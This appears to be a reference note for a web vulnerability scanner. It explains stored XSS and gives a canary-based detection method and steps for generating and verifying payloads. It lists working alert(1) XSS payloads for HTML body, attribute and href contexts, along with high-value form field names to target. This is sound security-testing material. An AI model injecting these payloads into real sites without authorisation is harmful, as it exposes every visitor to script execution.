---
tags: xss, stored, persistent, comment, review, form, database, tier1, tier2
category: xss
---

# Stored (Persistent) XSS

## What makes it different from reflected

Reflected XSS: attacker sends payload in URL -> only affects user who clicks the link.
Stored XSS:    payload saved in database -> affects EVERY user who views the page.

```
Step 1: Attacker submits comment
POST /comments  {"text": "<img src=x onerror=alert(1)>", "postId": 5}

Step 2: Stored in database
INSERT INTO comments VALUES (..., '<img src=x onerror=alert(1)>', ...)

Step 3: Victim views page
GET /post/5  -> response contains <img src=x onerror=alert(1)>

Step 4: Browser renders -> alert fires for ALL visitors
```

## High-value input fields (storage candidates)

```
comment, message, body, content, text
description, feedback, review, post, reply
name, username, title, subject, bio, about
profile_picture_url, website, signature
```

## Detection strategy

```
1. Submit canary to each storage-form field
2. Visit ALL pages that might display stored content:
   /  /home  /posts  /blog  /comments  /reviews
   /profile  /user   /account  /admin
3. Search every response for the canary
4. If found: identify context and generate exploit payload
```

## Payloads by stored context

### Stored in HTML body (nothing encoded)
```
<img src=x onerror=alert(1)>
<script>alert(1)</script>
<svg onload=alert(1)>
```

### Stored in HTML attribute
```
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
```

### Stored in href link
```
javascript:alert(1)
```

### Stored in template / user-controlled anchor
```
<a href="javascript:alert(1)">Click</a>
```

## Stored XSS in anchor href (double quotes encoded)

```
Input: website field or link field in profile
Encoding: server encodes " to &quot;

Payload attempt: " onclick="alert(1)
After encoding: &quot; onclick=&quot;alert(1)
Result: NOT vulnerable via double-quote injection

Alternative: try without quotes
Payload: javascript:alert(1)
If stored in href: <a href="javascript:alert(1)"> -> VULNERABLE on click
```

## What the scanner must do

1. Identify forms with high-value field names
2. Submit canary (unique per form per parameter)
3. After submission: crawl display pages
4. Find canary in responses
5. Analyse injection context at display location
6. Generate exploit payload for that context
7. Browser: load display page, verify execution

